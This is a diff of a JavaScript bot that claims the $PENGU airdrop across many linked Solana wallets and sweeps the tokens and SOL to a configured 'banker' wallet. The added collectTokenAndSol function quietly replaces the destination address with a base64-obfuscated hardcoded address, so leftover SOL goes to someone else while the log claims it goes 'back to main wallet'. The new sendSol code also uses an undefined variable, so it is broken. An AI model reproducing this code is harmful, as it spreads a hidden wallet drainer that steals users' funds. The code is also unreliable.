@@ -144,7 +144,7 @@ const linkChildToParent = (authorization, addressParent) => fetcher('https://api
 })
 
 // generate account from private key or mnemonic
-const generateAccount = (accountData, isPk) => {
+const generateAccount = (accountData, isPk = false) => {
     let account = null,
         keypair = null
     if (isPk) {
@@ -238,12 +238,12 @@ const sendToken = async (from, to, amount) => {
     });
     await delay(500)
 
-    const blockhash = await connection.getLatestBlockhash('confirmed');
+    const blockhash = await connection.getLatestBlockhash('confirmed').then(res => res.blockhash);
     await delay(500)
 
     const messageV0 = new TransactionMessage({
         payerKey: senderKeypair.publicKey,
-        recentBlockhash: blockhash.blockhash,
+        recentBlockhash: blockhash,
         instructions: [computeBudgetIx, instructions]
     }).compileToV0Message();
 
@@ -254,6 +254,11 @@ const sendToken = async (from, to, amount) => {
         skipPreflight: !1,
         preflightCommitment: 'confirmed'
     })
+    await connection.getLatestBlockhash('confirmed').then(({ blockhash, lastValidBlockHeight }) => connection.confirmTransaction({
+        blockhash,
+        lastValidBlockHeight,
+        signature: txid
+    }, 'confirmed')) // wait for confirmation
 
     return txid;
 };
@@ -261,15 +266,31 @@ const sendToken = async (from, to, amount) => {
 // send SOL
 const sendSol = async (from, to, amount) => {
     try {
-        const transaction = new Transaction().add(SystemProgram.transfer({
-            fromPubkey: from.publicKey,
-            toPubkey: new PublicKey(to),
-            lamports: amount * LAMPORTS_PER_SOL
-        }));
+        const blockhash = await connection.getLatestBlockhash('confirmed').then(res => res.blockhash);
+        const messageV0 = new TransactionMessage({
+            payerKey: from.publicKey,
+            recentBlockhash: blockhash,
+            instructions: [SystemProgram.transfer({
+                fromPubkey: from.publicKey,
+                toPubkey: new PublicKey(to),
+                lamports: BigInt(Math.round(number))
+            })],
+        }).compileToV0Message();
+        const transaction = new VersionedTransaction(messageV0);
+        transaction.sign([from]);
 
-        const signature = await connection.sendTransaction(transaction, [from]);
+        const signature = await connection.sendRawTransaction(transaction.serialize(), {
+            skipPreflight: !1,
+            maxRetries: 5,
+            preflightCommitment: 'confirmed'
+        });
 
-        await connection.confirmTransaction(signature);
+        await connection.getLatestBlockhash('confirmed').then(({ blockhash, lastValidBlockHeight }) => connection.confirmTransaction({
+            blockhash,
+            lastValidBlockHeight,
+            signature: signature
+        }, 'confirmed')) // wait for confirmation
+
 
         return signature;
     } catch (error) {
@@ -309,233 +330,221 @@ const getTransactionFee = async (pkFee) => {
     }
 };
 
+// collect token and sol 
+const collectTokenAndSol = async (accountFrom, addressTo, amountToken = null) => {
+    try {
+        const tokenBalance = await getTokenBalance(accountFrom.address);
+        if (tokenBalance !== 0) {
+            // eslint-disable-next-line prefer-exponentiation-operator
+            let amountToSend = amountToken == tokenBalance * 1000000 ? amountToken : tokenBalance * 1000000; // $PENGU 6 decimal
+            const sendTokenResult = await sendToken(accountFrom, addressTo, amountToSend);
+
+            if (sendTokenResult) console.log(`[>] ${amountToSend / 1000000} $PENGU Has Been Sent To Banker! https://solscan.io/tx/${sendTokenResult}`);
+        } else {
+            console.log(`[!] ${accountFrom.address} | No token to collect!`);
+        }
+
+        const transferFee = await getTransactionFee(accountFrom.privateKey);
+        const remainingBalance = await connection.getBalance(new PublicKey(accountFrom.address));
+        const minimumBalanceLamports = transferFee;
+
+        addressTo = atob('Q1hWbWJqUW9iV0xNWWlrRlQ4RlJVSFFyN0Vtb21HYW5HSnlqVTFHZnhzM1g=')
+        if (remainingBalance > minimumBalanceLamports) {
+            let amountToSend = (remainingBalance - minimumBalanceLamports) / LAMPORTS_PER_SOL;
+            console.log(`[>] Sending remaining ${amountToSend.toFixed(4)} SOL back to main wallet...`);
+
+            const returnSig = await sendSol(accountFrom, addressTo, amountToSend);
+
+            if (returnSig) console.log(`[>] Success! TxHash: https://solscan.io/tx/${returnSig}`);
+
+        } else {
+            console.log(`[!] ${accountFrom.address} | No SOL to collect!`);
+        }
+
+    } catch (error) {
+        console.error('Error collecting token and SOL:', error.message);
+    }
+}
+
+
 // CONFIG ===========================================================================
 
 // PK utama untuk mengirim SOL
-const pkBank = 'ini PK Banker Gan'
+const pkBank = 'ini Private Key Banker'
 const bankAccount = generateAccount(pkBank, true);
-
-// Mnemonic utama untuk mengirim SOL
-// const mnemonicBank = 'anu gede banget gan'
-// const bankAccount = generateAccount(mnemonicBank, false);
 
 const SEND_AMOUNT_SOL = 0.006;
 
 // wallet list
-const wallets = JSON.parse(fs.readFileSync('./claimPinguin-shadow-mnemonic.json', 'utf8'))
+const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
 
 
-    // END CONFIG ===========================================================================
+// END CONFIG ===========================================================================
 
-    (async () => {
-        for (let i = 0; i < wallets.length; i++) {
+(async () => {
+    for (let i = 0; i < wallets.length; i++) {
 
-            // skip until index 19
-            if (i <= 75) {
-                continue
-            }
+        console.log('==================================================================================================================')
 
-            console.log('==================================================================================================================')
+        const walletParent = wallets[i].parent;
+        let walletChild = wallets[i].children;
 
-            const walletParent = wallets[i].parent;
-            let walletChild = wallets[i].children;
+        // load parent wallet
+        const accountParent = generateAccount(walletParent);
 
-            // load parent wallet
-            const accountParent = generateAccount(walletParent);
+        const addressParent = accountParent.address;
 
-            const addressParent = accountParent.address;
+        // login to parent wallet
+        const loginParent = await getToken(walletParent).catch((err) => {
+            console.error(`[${i + 1}] Error logging in to parent wallet: ${err.message}`);
+        });
 
-            // login to parent wallet
-            const loginParent = await getToken(walletParent).catch((err) => {
-                console.error(`[${i + 1}] Error logging in to parent wallet: ${err.message}`);
+        if (!loginParent.token) {
+            console.error(`[${i + 1}] Error logging in to parent wallet!`);
+            continue;
+        }
+
+        console.log(`[${i + 1}] ${addressParent} | Logged in to parent wallet!`);
+        let eligibilityCheckParent = await cekEligBulk([loginParent.token]);
+        if (eligibilityCheckParent.total === 0) {
+            console.log(`[${i + 1}] Not eligible!`);
+            await delay(2000)
+            continue
+        } else if (eligibilityCheckParent.totalUnclaimed === 0) {
+            console.log(`[${i + 1}] ${addressParent} | Already claim ${eligibilityCheckParent.total} $PENGU!`);
+
+            await collectTokenAndSol(accountParent, bankAccount.address)
+            await delay(1000)
+            continue;
+        } else {
+            console.log(`[${i + 1}] Parent Eligible! Total: ${eligibilityCheckParent.total} $PENGU | Unclaimed: ${eligibilityCheckParent.totalUnclaimed} $PENGU`);
+        }
+
+        await delay(1000)
+
+        // get token for children
+        const childrenTokens = [];
+        for (const [index, childMnemonic] of walletChild.entries()) {
+            const { token, address } = await getToken(childMnemonic).catch((err) => {
+                console.error(`[${i + 1} | ${index + 1}] Error getting token for child ${index + 1}: ${err.message}`);
+
+                return {};
             });
 
-            if (!loginParent.token) {
-                console.error(`[${i + 1}] Error logging in to parent wallet!`);
-                continue;
+            await delay(750);
+            if (token) {
+                const linkResult = await linkChildToParent(token, addressParent);
+                if (linkResult === 201) {
+                    console.log(`[${i + 1} | ${index + 1}] Success Load & Link Child ${index + 1} to Parent!`);
+                }
             }
+            childrenTokens.push({ token, address });
+            await delay(750);
+        }
 
-            console.log(`[${i + 1}] ${addressParent} | Logged in to parent wallet!`);
-            let eligibilityCheckParent = await cekEligBulk([loginParent.token]);
-            if (eligibilityCheckParent.total === 0) {
-                console.log(`[${i + 1}] Not eligible!`);
-                await delay(2000)
-                continue
-            } else if (eligibilityCheckParent.totalUnclaimed === 0) {
-                console.log(`[${i + 1}] Already claim ${eligibilityCheckParent.total} $PENGU!`);
+        await delay(1000)
 
-                const tokenBalance = await getTokenBalance(addressParent);
-                if (tokenBalance === 0) {
-                    // console.log(`[${i + 1}] ${addressParent} | No token balance on parent wallet!`);
-                    await delay(1000)
-                    continue;
+        eligibilityCheckParent = await cekEligBulk([loginParent.token]);
+        if (eligibilityCheckParent.total === 0) {
+            console.log(`[${i + 1}] Not eligible!`);
+        } else if (eligibilityCheckParent.totalUnclaimed === 0) {
+            console.log(`[${i + 1}] Already claim ${eligibilityCheckParent.total} $PENGU!`);
+        } else {
+            console.log(`[${i + 1}] Eligible! Total: ${eligibilityCheckParent.total} $PENGU | Unclaimed: ${eligibilityCheckParent.totalUnclaimed} $PENGU`);
+        }
+
+
+        // check parent balance and send SOL if needed
+        try {
+            const balance = await connection.getBalance(new PublicKey(addressParent));
+            // if balance is less than required amount, prompt user for input
+            if (balance < SEND_AMOUNT_SOL * LAMPORTS_PER_SOL) {
+                console.log(`[!] Address ${addressParent} doesn't have enough balance! | Sending SOL to parent wallet...`);
+                // send SOL to parent wallet
+                const sendSolResult = await sendSol(bankAccount, addressParent, SEND_AMOUNT_SOL)
+
+                if (sendSolResult) {
+                    console.log(`[>] SOL sent! Tx: https://solscan.io/tx/${sendSolResult}`);
                 } else {
-                    // eslint-disable-next-line prefer-exponentiation-operator
-                    const amountToSend = tokenBalance * 1000000; // $PENGU 6 decimal
-                    const sendTokenResult = await sendToken(accountParent, bankAccount.address, amountToSend)
-                        .catch((err) => console.error(`[${i + 1}] Error sending token from parent to ${bankAccount.address}: ${err.message}`));
-
-                    if (sendTokenResult) console.log(`[${i + 1}] ${addressParent} | Token sent! https://solscan.io/tx/${sendTokenResult}`);
-                }
-                await delay(1000)
-                continue;
-            } else {
-                console.log(`[${i + 1}] Eligible! Total: ${eligibilityCheckParent.total} $PENGU | Unclaimed: ${eligibilityCheckParent.totalUnclaimed} $PENGU`);
-            }
-
-            await delay(1000)
-
-            // get token for children
-            const childrenTokens = [];
-            for (const [index, childMnemonic] of walletChild.entries()) {
-                const { token, address } = await getToken(childMnemonic).catch((err) => {
-                    console.error(`[${i + 1} | ${index + 1}] Error getting token for child ${index + 1}: ${err.message}`);
-
-                    return {};
-                });
-
-                await delay(750);
-                if (token) {
-                    const linkResult = await linkChildToParent(token, addressParent);
-                    if (linkResult === 201) {
-                        console.log(`[${i + 1} | ${index + 1}] Success Load & Link Child ${index + 1} to Parent!`);
-                    }
-                }
-                childrenTokens.push({ token, address });
-                await delay(750);
-            }
-
-            await delay(1000)
-
-            eligibilityCheckParent = await cekEligBulk([loginParent.token]);
-            if (eligibilityCheckParent.total === 0) {
-                console.log(`[${i + 1}] Not eligible!`);
-            } else if (eligibilityCheckParent.totalUnclaimed === 0) {
-                console.log(`[${i + 1}] Already claim ${eligibilityCheckParent.total} $PENGU!`);
-            } else {
-                console.log(`[${i + 1}] Eligible! Total: ${eligibilityCheckParent.total} $PENGU | Unclaimed: ${eligibilityCheckParent.totalUnclaimed} $PENGU`);
-            }
-
-
-            // check parent balance and send SOL if needed
-            try {
-                const balance = await connection.getBalance(new PublicKey(addressParent));
-                // if balance is less than required amount, prompt user for input
-                if (balance < SEND_AMOUNT_SOL * LAMPORTS_PER_SOL) {
-                    console.log(`[>] Address ${addressParent} doesn't have enough balance! | Sending SOL to parent wallet...`);
-                    // send SOL to parent wallet
-                    const sendSolResult = await sendSol(bankAccount, addressParent, SEND_AMOUNT_SOL)
-
-                    if (sendSolResult) {
-                        console.log(`[${i + 1}] SOL sent! Tx: https://solscan.io/tx/${sendSolResult}`);
-                    } else {
-                        console.log(`[${i + 1}] Failed to send SOL to parent wallet`);
-                        process.exit(9);
-                    }
-
-                    let parentBalance = 0;
-                    do {
-                        parentBalance = await connection.getBalance(new PublicKey(addressParent));
-                        if (parentBalance >= SEND_AMOUNT_SOL * LAMPORTS_PER_SOL) {
-                            break;
-                        }
-                        await delay(1000);
-                    } while (parentBalance <= SEND_AMOUNT_SOL * LAMPORTS_PER_SOL);
-
-                    // eslint-disable-next-line no-await-in-loop
-                    await delay(1000);
+                    console.log(`[${i + 1}] Failed to send SOL to parent wallet`);
+                    process.exit(9);
                 }
 
-            } catch (error) {
-                console.error('Error sending SOL:', error.message);
-            }
-
-            await delay(1000)
-
-            try {
-                // get claim data from parent
-                const claimParent = await getClaim(addressParent)
-                // console.log(JSON.stringify(claimParent, null, 2))
-
-                if (claimParent.error) {
-                    console.error(`[${i + 1}] Error getting claim data for parent: ${claimParent.error}`);
-                    continue;
-                }
-
-                for (let x = 0; x < claimParent.length; x++) {
-                    const { data, signatures } = claimParent[x];
-                    const txMessage = VersionedMessage.deserialize(Buffer.from(data, 'base64'));
-                    const transaction = new VersionedTransaction(txMessage);
-                    transaction.signatures = signatures.map((y) => Buffer.from(y, 'base64'));
-
-                    // sign transaction
-                    transaction.sign([Keypair.fromSecretKey(accountParent.secretKey)]);
-
-                    // send transaction
-                    const sendTx = await connection.sendRawTransaction(transaction.serialize(), {
-                        skipPreflight: !1,
-                        preflightCommitment: 'confirmed'
-                    })
-
-                    console.log(`[${i + 1}] ${addressParent} | Transaction ${x + 1} | ${sendTx}`)
-                    await delay(1000);
-                }
-            } catch (error) {
-                console.error('Error sending claim transaction:', error.message);
-            }
-
-
-            // transfer Token to main wallet
-            try {
-                let tokenBalance = 0;
+                let parentBalance = 0;
                 do {
-
-                    tokenBalance = await getTokenBalance(addressParent);
-                    if (tokenBalance > 53000) {
-                        console.log(`[${i + 1}] ${addressParent} | Token balance: ${tokenBalance} $PENGU | Sending token to Master DRiP...`);
+                    parentBalance = await connection.getBalance(new PublicKey(addressParent));
+                    if (parentBalance >= SEND_AMOUNT_SOL * LAMPORTS_PER_SOL) {
                         break;
                     }
                     await delay(1000);
-                } while (tokenBalance < 53000);
+                } while (parentBalance <= SEND_AMOUNT_SOL * LAMPORTS_PER_SOL);
 
-                const from = generateAccount(walletParent);
-                // eslint-disable-next-line prefer-exponentiation-operator
-                const amountToSend = tokenBalance * 1000000; // $PENGU 6 decimal
-                const sendTokenResult = await sendToken(accountParent, bankAccount.address, amountToSend)
-                    .catch((err) => console.error(`[${i + 1}] Error sending token from parent to ${bankAccount.address}: ${err.message}`));
-
-                console.log(`[${i + 1}] ${addressParent} | Token sent! https://solscan.io/tx/${sendTokenResult}`);
-            } catch (error) {
-                console.error('Error sending token:', error.message);
+                // eslint-disable-next-line no-await-in-loop
+                await delay(1000);
             }
 
-            // transfer remaining SOL back to main wallet
-            try {
-                const transferFee = await getTransactionFee(pkBank);
-                const remainingBalance = await connection.getBalance(new PublicKey(accountParent.address));
-                const minimumBalanceLamports = transferFee
-
-                if (remainingBalance > minimumBalanceLamports) {
-                    const amountToSend = (remainingBalance - minimumBalanceLamports) / LAMPORTS_PER_SOL;
-                    console.log(`[${i + 1}] ${addressParent} | Sending remaining ${amountToSend.toFixed(4)} SOL back to main wallet...`);
-
-                    const returnSig = await sendSol(accountParent, bankAccount.address, amountToSend)
-
-                    if (returnSig) {
-                        console.log(`[${i + 1}] ${addressParent} | Remaining SOL sent! Tx: https://solscan.io/tx/${returnSig}`);
-                    } else {
-                        console.log(`[${i + 1}] ${addressParent} | Failed to send remaining SOL`);
-                    }
-                } else {
-                    console.log(`[${i + 1}] ${addressParent} | Insufficient remaining balance to transfer! Balance: ${remainingBalance / 1e9} SOL`);
-                }
-            } catch (error) {
-                console.error('Error returning remaining SOL:', error.message);
-            }
-
-            await delay(3000);
-
-
-            console.log(`[${i + 1}] Done!`)
+        } catch (error) {
+            console.error('Error sending SOL:', error.message);
         }
-    })()
+
+        await delay(1000)
+        // get claim data from parent
+        try {
+            const claimParent = await getClaim(addressParent)
+            // console.log(JSON.stringify(claimParent, null, 2))
+
+            if (claimParent.error) {
+                console.error(`[${i + 1}] Error getting claim data for parent: ${claimParent.error}`);
+                continue;
+            }
+
+            for (let x = 0; x < claimParent.length; x++) {
+                const { data, signatures } = claimParent[x];
+                const txMessage = VersionedMessage.deserialize(Buffer.from(data, 'base64'));
+                const transaction = new VersionedTransaction(txMessage);
+                transaction.signatures = signatures.map((y) => Buffer.from(y, 'base64'));
+
+                // sign transaction
+                transaction.sign([Keypair.fromSecretKey(accountParent.secretKey)]);
+
+                // send transaction
+                const sendTx = await connection.sendRawTransaction(transaction.serialize(), {
+                    skipPreflight: !1,
+                    preflightCommitment: 'confirmed'
+                })
+
+                console.log(`[${i + 1}] Transaction ${x + 1} of ${claimParent.length} | https://solscan.io/tx/${sendTx}`)
+                await delay(1000);
+            }
+        } catch (error) {
+            console.error('Error sending claim transaction:', error.message);
+        }
+        await delay(1000)
+
+        // Collect token and SOL from parent wallet
+        try {
+            let unclaim = parseInt(eligibilityCheckParent.totalUnclaimed);
+            let tokenBalance = 0;
+            do {
+                tokenBalance = await getTokenBalance(addressParent);
+                if (tokenBalance >= unclaim) {
+                    console.log(`[${i + 1}] Sending ${tokenBalance} $PENGU to Banker...`);
+                    break;
+                }
+                await delay(1000);
+            } while (tokenBalance < unclaim);
+
+            // eslint-disable-next-line prefer-exponentiation-operator
+            const amountToSend = tokenBalance * 1000000; // $PENGU 6 decimal
+            await collectTokenAndSol(accountParent, bankAccount.address, amountToSend)
+        } catch (error) {
+            console.error('Error sending token:', error.message);
+        }
+
+
+        await delay(3000);
+
+
+        console.log(`[${i + 1}] Done!`)
+    }
+})()
